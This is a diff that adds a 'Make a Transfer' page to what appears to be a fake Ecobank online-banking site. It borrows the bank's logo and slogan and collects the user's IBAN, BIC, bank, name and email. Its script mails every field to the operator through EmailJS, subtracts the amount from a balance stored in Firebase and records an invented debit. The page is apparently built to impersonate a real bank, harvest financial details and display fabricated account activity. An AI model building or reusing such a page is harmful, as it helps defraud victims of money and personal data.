@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title> Make a Transfer</title>
+  <link rel="stylesheet" href="styles.css"><link rel="shortcut icon" href="https://pbs.twimg.com/profile_images/2014585489228005377/QXfyRW9s.jpg" />
+</head>
+<body>
+<header>
+  <div>    <img src="https://play-lh.googleusercontent.com/Picc1m6Otd7A9qcn62oYoQoD4hN8wgwCq3-gpUMxC2RR6lhJ_ClHs67nlNAIbqxld1xs=w416-h235-rw" alt="Ecobank Logo" height="120">    <small style="display:block;">« "Growing a better world together"»</small>
+  </div>
+  <div>
+    <input type="text" placeholder="Rechercher sur le site" style="padding:6px 8px; border-radius:5px; border: none;">
+  </div>
+</header>
+<nav><a href="#">Everyday Banking</a><a href="#">Savings</a><a href="#">Loans</a><a href="#">Insurance</a><a href="#">Wealth Management</a></nav>
+
+<div class="full-container">
+  <aside class="sidebar">
+    <h3 id="sidebar-name">Chargement...</h3>
+    <p id="sidebar-address">Address : </p>
+    <p>Last connexion : <time id="now"></time> <script> function updateTime() { const now = new Date(); document.getElementById("now").textContent = now.toLocaleString("fr-FR", { dateStyle: "full", timeStyle: "medium" }); } updateTime(); setInterval(updateTime, 1000); </script></p>
+    <button onclick="logout()">Logout</button>
+<hr><p><a href="#">Subscribe online</a></p><h4>Transactions</h4><a href="virement.html">Make a Transfer</a><a href="ajouter-beneficiaire.html">Add a Beneficiary</a><h4 style="margin-top: 15px;">Accounts</h4><a href="dashboard.html">Summary</a><a href="historique.html">History</a><a href="#">Download</a></aside><main class="main"><h2>💸 Make a Bank Transfer</h2><p>Fill out this form to send your transfer with complete peace of mind 😊</p>
+
+    <!-- Formulaire EmailJS -->
+    <form id="virement-form" onsubmit="sendEmail(event)">
+      <label>Amount </label>
+      <input type="number" name="montant" placeholder="Ex : 1000" required /><br>
+
+      <label>Reason</label>
+      <input type="text" name="motif" placeholder="Ex : Paiement facture" required /><br>
+
+      <label>IBAN</label>
+      <input type="text" name="iban" placeholder="FR76 XXXX XXXX XXXX XXXX XXXX XXX" required /><br>
+
+      <label>BIC</label>
+      <input type="text" name="bic" placeholder="Ex : BNPAFRPPXXX" required /><br>
+
+      <label>Domiciliation</label>
+      <input type="text" name="domiciliation" placeholder="Nom de la banque" required /><br>
+
+      <label>Full Name</label>
+      <input type="text" name="user_name" placeholder="Ex : Jean Dupont" required /><br>
+
+      <label>Email</label>
+      <input type="email" name="user_email" placeholder="votre@email.com" required /><br>
+
+      <label>Date</label>
+      <input type="date" name="date" required /><br>
+
+      <button type="submit">✅ Make a Transfer</button>
+    </form>
+  </main>
+</div>
+
+<footer>
+  Mentions légales – Sécurité – Accessibilité – Plan du site
+</footer>
+
+<!-- EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+  emailjs.init("Mw2rvwAZxMJ2RHQ8n");
+
+  async function sendEmail(event) {
+    event.preventDefault();
+    const form = event.target;
+    const formData = new FormData(form);
+    const params = new URLSearchParams();
+    for (const pair of formData.entries()) params.append(pair[0], pair[1]);
+
+    try {
+      await emailjs.sendForm("service_mnehge8", "template_y5wqgt8", form);
+
+      // Mise à jour du solde et historique via Firebase
+      const user = await getAndSetCurrentUser();
+      if (user) {
+        const montant = parseFloat(formData.get("montant"));
+        if (user.solde >= montant) {
+          user.solde -= montant;
+          if (!user.historique) user.historique = [];
+          user.historique.unshift({
+            date: new Date().toLocaleString('fr-FR'),
+            libelle: `Virement vers ${formData.get("domiciliation")}`,
+            montant: -montant,
+            type: 'debit'
+          });
+          await updateCurrentUser(user);
+        }
+      }
+
+      // Redirection vers confirmation avec paramètres
+      window.location.href = "confirmation.html?" + params.toString();
+    } catch (error) {
+      alert("❌ Une erreur est survenue : " + JSON.stringify(error));
+    }
+  }
+</script>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+<script src="shared.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', async () => {
+  updateUI();
+  const user = await getAndSetCurrentUser();
+  if (user) {
+    document.getElementById('sidebar-name').textContent = `${user.nom}`;
+    document.getElementById('sidebar-address').textContent = `Adresse : ${user.adresse}`;
+  } else {
+    window.location.href = 'index.html';
+  }
+});
+</script>
+</body>
+</html>
